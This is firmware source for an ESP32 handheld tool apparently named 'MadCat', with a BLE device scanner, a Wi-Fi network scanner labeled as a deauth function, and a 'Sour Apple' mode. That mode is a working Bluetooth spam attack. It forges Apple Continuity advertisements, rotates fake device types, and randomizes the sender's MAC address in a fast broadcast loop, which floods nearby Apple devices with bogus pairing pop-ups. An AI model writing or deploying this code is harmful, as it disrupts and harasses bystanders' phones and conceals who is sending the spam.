#include "config.h"

namespace {
  BLEScan* pBLEScan = nullptr;
  bool bleScanning = false;
  int bleDeviceCount = 0;
  int selectedDevice = 0;
  unsigned long lastBleUpdate = 0;
  String bleNames[20];
  int bleRssi[20];
  int bleAddrType[20];
  int storedBleCount = 0;
}

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    if (storedBleCount < 20) {
      String name = String(advertisedDevice.getName().c_str());
      if (name.length() == 0) name = "Unknown";
      bleNames[storedBleCount] = name;
      bleRssi[storedBleCount] = advertisedDevice.getRSSI();
      bleAddrType[storedBleCount] = advertisedDevice.getAddressType();
      storedBleCount++;
    }
  }
};

void bleScanSetup() {
  storedBleCount = 0;
  bleDeviceCount = 0;
  selectedDevice = 0;
  lastBleUpdate = 0;
  bleScanning = false;
  u8g2.clearBuffer();
  drawFunctionHeader("BLE Scanner");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);
  u8g2.print("Iniciando...");
  u8g2.sendBuffer();
  BLEDevice::init("MadCat");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks(), false);
  BLEScanResults results = pBLEScan->start(3, false);
  bleDeviceCount = storedBleCount;
  bleScanning = true;
  lastBleUpdate = millis();
}

void bleScanLoop() {
  if (buttonPressed(BTN_BACK)) {
    if (pBLEScan) pBLEScan->stop();
    BLEDevice::deinit(false);
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }
  if (!bleScanning) return;
  if (millis() - lastBleUpdate > 3000) {
    storedBleCount = 0;
    pBLEScan->clearResults();
    BLEScanResults results = pBLEScan->start(2, false);
    bleDeviceCount = storedBleCount;
    lastBleUpdate = millis();
  }
  u8g2.clearBuffer();
  drawFunctionHeader("BLE Scanner");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 22);
  u8g2.print("BLE Devices: ");
  u8g2.print(bleDeviceCount);
  int start = selectedDevice;
  for (int i = 0; i < 3 && (start + i) < bleDeviceCount; i++) {
    int idx = start + i;
    u8g2.setCursor(0, 34 + (i * 10));
    if (idx == selectedDevice) u8g2.print("> ");
    else u8g2.print("  ");
    String name = bleNames[idx];
    if (name.length() > 12) name = name.substring(0, 12);
    u8g2.print(name);
    u8g2.print(" ");
    u8g2.print(bleRssi[idx]);
  }
  if (bleDeviceCount == 0) {
    u8g2.setCursor(0, 40);
    u8g2.print("Nenhum dispositivo");
    u8g2.setCursor(0, 52);
    u8g2.print("Aguardando...");
  }
  u8g2.setCursor(0, 62);
  u8g2.print("UP/DOWN:Navegar");
  u8g2.sendBuffer();
  if (buttonPressed(BTN_DOWN) && selectedDevice < bleDeviceCount - 1) selectedDevice++;
  if (buttonPressed(BTN_UP) && selectedDevice > 0) selectedDevice--;
}

namespace {
  bool wifiInitialized = false;
  int apCount = 0;
  int selectedAp = 0;
  unsigned long lastWifiScan = 0;
}

void wifiDeauthSetup() {
  u8g2.clearBuffer();
  drawFunctionHeader("WiFi Scan");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);
  u8g2.print("Scanning...");
  u8g2.sendBuffer();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  apCount = WiFi.scanNetworks();
  wifiInitialized = true;
  selectedAp = 0;
  lastWifiScan = millis();
}

void wifiDeauthLoop() {
  if (buttonPressed(BTN_BACK)) {
    WiFi.disconnect();
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }
  if (!wifiInitialized) return;
  if (millis() - lastWifiScan > 10000) {
    apCount = WiFi.scanNetworks();
    lastWifiScan = millis();
    if (selectedAp >= apCount) selectedAp = max(apCount - 1, 0);
  }
  u8g2.clearBuffer();
  drawFunctionHeader("WiFi Scan");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 22);
  u8g2.print("Redes WiFi:");
  for (int i = 0; i < 3 && i < apCount; i++) {
    u8g2.setCursor(0, 34 + (i * 10));
    if (i == selectedAp) u8g2.print("> ");
    else u8g2.print("  ");
    String ssid = WiFi.SSID(i);
    if (ssid.length() > 12) ssid = ssid.substring(0, 12);
    u8g2.print(ssid);
    u8g2.print(" ");
    u8g2.print(WiFi.RSSI(i));
  }
  u8g2.setCursor(0, 62);
  u8g2.print("Redes: ");
  u8g2.print(apCount);
  u8g2.sendBuffer();
  if (buttonPressed(BTN_DOWN) && selectedAp < apCount - 1) selectedAp++;
  if (buttonPressed(BTN_UP) && selectedAp > 0) selectedAp--;
}

namespace {
  BLEAdvertising *pAdvertising = nullptr;
  bool appleSpamming = false;
  uint8_t packet[17];
}

void sourAppleSetup() {
  appleSpamming = false;
  u8g2.clearBuffer();
  drawFunctionHeader("Sour Apple");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);
  u8g2.print("SEL: Iniciar/Parar");
  u8g2.setCursor(0, 42);
  u8g2.print("BACK: Menu");
  u8g2.sendBuffer();
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  packet[0] = 16;
  packet[1] = 0xFF;
  packet[2] = 0x4C;
  packet[3] = 0x00;
  packet[4] = 0x0F;
  packet[5] = 0x05;
  packet[6] = 0xC1;
  packet[7] = 0x27;
  packet[8] = 0x00;
  packet[9] = 0x00;
  packet[10] = 0x00;
  packet[11] = 0x00;
  packet[12] = 0x00;
  packet[13] = 0x00;
  packet[14] = 0x00;
  packet[15] = 0x00;
  packet[16] = 0x00;
}

void sourAppleLoop() {
  if (buttonPressed(BTN_BACK)) {
    appleSpamming = false;
    if (pAdvertising) pAdvertising->stop();
    BLEDevice::deinit(false);
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }
  if (buttonPressed(BTN_SELECT)) {
    appleSpamming = !appleSpamming;
    delay(200);
  }
  u8g2.clearBuffer();
  drawFunctionHeader("Sour Apple");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);
  u8g2.print(appleSpamming ? "Status: SPAMMING" : "Status: PARADO");
  if (appleSpamming) {
    u8g2.setCursor(0, 42);
    u8g2.print("Dispositivo: ");
    const char* devNames[] = {"AirPods", "AirPods Pro", "AirPods Max",
                              "PowerBeats", "Beats Solo", "AppleTV",
                              "HomePod", "iPad", "iPhone", "Watch", "Mac"};
    u8g2.print(devNames[packet[7] % 11]);
  }
  u8g2.setCursor(0, 56);
  u8g2.print("BACK: Parar e sair");
  u8g2.sendBuffer();
  if (appleSpamming) {
    const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
    int numTypes = sizeof(types) / sizeof(types[0]);
    packet[7] = types[random(numTypes)];
    uint8_t addr[6];
    for (int i = 0; i < 6; i++) addr[i] = random(256);
    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, 17));
    pAdvertising->setAdvertisementData(advData);
    esp_ble_gap_set_rand_addr(addr);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
    delay(30);
  }
}
